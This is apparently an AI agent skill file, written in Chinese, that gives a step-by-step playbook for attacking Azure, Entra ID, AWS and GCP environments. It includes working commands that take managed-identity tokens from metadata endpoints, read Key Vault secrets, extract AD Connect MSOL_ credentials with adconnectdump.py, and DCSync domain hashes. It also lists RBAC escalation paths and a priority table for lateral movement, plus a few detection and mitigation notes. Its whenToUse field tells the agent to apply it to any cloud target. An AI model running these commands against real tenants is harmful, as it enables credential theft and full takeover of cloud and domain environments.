---
name: 'cloud-attacks'
description: '云攻击面：Azure IMDS→Entra ID→CVE-2025-55241 Actor Token→RBAC提权→AD Connect横向→AWS/GCP速查（检索词：cloud/azure/aws/gcp/entra/imds/rbac/passkey/pass-the-passkey/aitm/device-code/prt/token-theft/cae/conditional-access/pass the passkey/device code/token theft/conditional access/cloud attacks）'
whenToUse: '目标在云上（Azure/Entra ID/AWS/GCP）时：IMDS→Entra ID→Actor Token→RBAC 提权→AD Connect 横向。'
metadata: { domain: cloud, tier: T2 }
---

# 云攻击面（Azure / Entra ID）

> 🔴 **填补 aws-attack-surface 的空白。Azure/Entra ID 是 2025-2026 最热门云攻击面。**

## 0. 前置：识别云环境

```
# Azure
[ ] env | grep -iE 'AZURE\|MSI\|IMDS\|IDENTITY'
[ ] curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
[ ] whoami → AzureAD\
[ ] dir "C:\Program Files\Microsoft Monitoring Agent"  # Log Analytics / ARC

# Entra ID (Azure AD)
[ ] 域控安装了 Azure AD Connect → 本地 AD → 云横向
[ ] 🔴 adconnectdump.py DOMAIN/ADMIN@CONNECT-SERVER → 提取 MSOL_ 凭据 → DCSync → 本地 DA = 云 GA
```

---

## 1. Azure 元数据 API (IMDS)

```
# 获取 Azure Resource Manager token
AZ_TOKEN=`curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`

# 用 token 调 Azure REST API
curl -s -H "Authorization: Bearer $AZ_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2019-06-01"
curl -s -H "Authorization: Bearer $AZ_TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/resources?api-version=2019-10-01"

# Key Vault 读取 (🔴 必须用 vault.azure.net 专用 token!)
VAULT_TOKEN=`curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`
curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://<vault>.vault.azure.net/secrets/<secret>?api-version=7.2"
```

---

## 2. Entra ID (Azure AD) 攻击

### 2.1 Azure AD Connect → 云横向

```
# 本地 AD → Entra ID 横向
# 🔴 工具: adconnectdump.py (dirkjanm) — GitHub 可获取
# adconnectdump.py DOMAIN/ADMIN-USER@CONNECT-SERVER-IP
# → 提取 MSOL_ 账户凭据 → 该账户有 DCSync 权限 → DCSync → 本地 DA = 云 GA

[ ] 找到 AD Connect / Entra Connect 服务器
[ ] C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll 存在?
[ ] adconnectdump.py → 提取 encrypted_configuration → 解密 MSOL_ 密码
[ ] 拿到 MSOL_ 密码 → DCSync → 所有域用户 NT hash
```

### 2.2 CVE-2025-55241 Actor Token (CVSS 10.0, 已修复)

```
# 发现者: Dirk-jan Mollema (2025-07)
# 原理: Actor Token (内部 S2S 模拟令牌) + 旧 Graph API 不验证来源 tenant
# 影响: 任意租户 Global Admin — 绕过 MFA/CA/日志
# 状态: Microsoft 2025-09 服务端修复, 无需客户操作
```

### 2.3 其他 Entra ID 攻击面

```
# 应用注册 & Service Principals
Get-MgServicePrincipal → 有高权限 SPN → 用其权限
Get-MgApplication → 应用密钥/证书 → 窃取密码

# OAuth 权限滥用
Get-MgOauth2PermissionGrant → Delegated vs Application permissions
→ 恶意 OAuth 应用注册 (Illicit Consent Grant)

# B2B 信任
Get-MgCrossTenantAccessPolicy → 跨租户信任配置 → 跳板
```

### 2.4 🔴 Pass-the-Passkey（Black Hat USA 2026, Michael Grafnetter）

> **不是破解密码学，是实现缺口。** passkey 的钓鱼抗性依赖"断言不可重放"，而两个环节没做到。

- **缺口 ①**：Windows 11 把**完整 WebAuthn 断言响应**写进了**事件日志** → 读到日志即拿到可重放材料。
- **缺口 ②**：Entra ID 未完全强制**防重放**三件套 —— **挑战唯一性 / 会话绑定 / 签名计数器校验**。
- **结果**：捕获的断言可**重放冒充用户** → 号称"抗钓鱼"的认证被绕过。
- **已修复**：微软**截断了日志内容** + Entra 开始校验签名计数器。

🔴 **审计要点**：passkey 降低钓鱼风险，但**不消除**"断言如何被存储与校验"的需求。
落地检查两件事：WebAuthn 日志是否仍落完整断言；Entra 是否**强制**签名计数器。

### 2.5 🔴 Token 窃取 —— 2026 的主流身份攻击（比 pass-the-passkey 更高频）

**载体**：OAuth access/refresh token、会话 cookie、**PRT（Primary Refresh Token）**。

| 手法 | 机制 | 为什么日志里看不出来 |
|------|------|---------------------|
| **AiTM 钓鱼**（Evilginx 等） | 实时代理整个登录流程，中继凭据 + MFA，**捕获认证后的会话** | 日志显示**成功登录 + MFA 已满足**，不产生失败事件 |
| **设备代码流滥用** | 诱导受害者在 `microsoft.com/devicelogin` 输入代码，攻击者轮询 token endpoint | **完全无 MFA 挑战** |
| **ConsentFix** | 拖拽/复制粘贴 OAuth 授权码 | 不偷密码、不触发 MFA |
| **PRT 提取** | 拿到 PRT → 对全部 Entra 集成应用无缝 SSO | 云优先环境里**等价于域管** |

🔴 **检测必须靠关联，不能靠单事件**：
token 窃取的登录事件**长得像正常登录**；UA/IP 差异在"员工到处跑、多设备"的云环境里**假阳性太高**。
→ 关联四要素：**认证方式 + token 生命周期异常 + 资源访问模式 + 事件间时序**。

**缓解**：token protection / token binding（把会话绑到设备）+ **CAE**（Continuous Access Evaluation，会话中途按风险信号近实时吊销）。

**规模参考**：一年内 infostealer 日志中流转的**被盗浏览器 cookie 超 524 亿条**（NordVPN 2026）。

### 2.6 Entra ID 2025–2026 关键 CVE

> 口径说明：本表跨 2025/2026 两年 —— `CVE-2025-55241` 是 2025 年的 Actor Token 缺陷，与 §2.2 互指，
> 故**保留在表内并放宽标题年份**（移出会切断与 §2.2 的交叉引用）。标题不再自称「2026 关键 CVE」。

| CVE | 分值 | 说明 |
|-----|------|------|
| **CVE-2026-69836** | **10.0** | 不可信数据反序列化 → 未认证、无交互、网络可达 RCE |
| CVE-2026-42901 | 10.0 | 源验证错误 → 未认证**跨租户**提权 |
| CVE-2026-24305 | — | 授权不当 → 未认证提权 |
| CVE-2026-65801 | 10.0 | Exchange Online 提权 |
| CVE-2026-69502 / 69555 / 65816 | 10.0 | Azure SQL / Azure Arc 提权 |
| CVE-2026-65770 | 10.0 | Azure Managed Instance for Apache Cassandra RCE |
| CVE-2026-24301 | — | **Copilot 命令注入**（远程信息泄露）|
| CVE-2025-55241 | 严重 | Actor Token 缺陷 → 对**任意**租户 Global Admin（见 §2.2）|
| CVE-2026-56155 | — | **AD FS DKM ACL 提权**：拿 DKM → 窃 token-signing 证书 → **伪造任意令牌** |
| CVE-2026-25177 | 8.8 | AD DS 提权：认证域用户 → 无需提升起点、无需交互即可域级横向 |

🔴 **教训（比 CVE 本身重要）**：`CVE-2026-69836` 属「**厂商代修漏洞**」—— 微软已在服务端完全修复，**客户无需打补丁**。
→ 你**无法打补丁、无法验证修复**，只能靠检测与保证。这类漏洞**仍要进威胁模型**。

⚠️ **AD FS DKM 应急轮换的坑**：要连 **"previous" 位置**的旧证书一起顶掉，否则信任链**仍接受被泄证书**。

**趋势**：微软 **2026-09-01 起**对 SMS/voice MFA 用户自动推送 passkey 注册；**2027-02-01 彻底退役**原生 SMS/voice。

---

## 3. Azure RBAC 提权

```
# VM 上的 MI (Managed Identity) → 获取 token → 查 role assignments

# 常见提权路径:
[ ] VM Contributor    → az vm run-command invoke → RunPowerShellScript → SYSTEM
[ ] Key Vault Reader  → 读 secrets/certs → 横向
[ ] Storage Blob Data → 读源码/config → 发现更多凭据
[ ] Logic App Contributor → 修改 workflow → 触发执行
[ ] Automation Contributor → 创建/修改 Runbook → 执行脚本
```

---

## 4. AWS 攻击面 (补充)

> 详见 aws-attack-surface skill

```
# 元数据
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# IMDSv2
AWS_TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -s -H "X-aws-ec2-metadata-token: $AWS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
```

---

## 5. GCP 攻击面

```
# 元数据
GCP_TOKEN=`curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://www.googleapis.com/compute/v1/projects"
```

---

## 6. 🆕 云关键资源（2026 重点）

```
# AI/ML 资源 → SageMaker / Azure ML / Vertex AI → 训练脚本凭据注入
# CI/CD 即服务 → GitHub Actions / CodeBuild → pipeline 注入
# Serverless → Lambda / Azure Functions → 密钥硬编码 → IAM Role 横向
```

---

## 快速优先级

| 优先级 | 条件 | 方法 |
|--------|------|------|
| 🔴 1 | curl IMDS 成功 | 获取 token → 查 role → 横向 |
| 🔴 2 | AD Connect 服务器 | adconnectdump.py 提取 MSOL_ → DCSync |
| 🔴 3 | VM Managed Identity | 枚举 role → az vm run-command |
| 🔴 4 | Key Vault 权限 | 读 secrets/certs |
| 🟠 5 | AWS/GCP 元数据 | IMDSv2 → STS → IAM 横向 |
| 🟡 6 | Logic App / Automation | 修改 workflow → RCE |
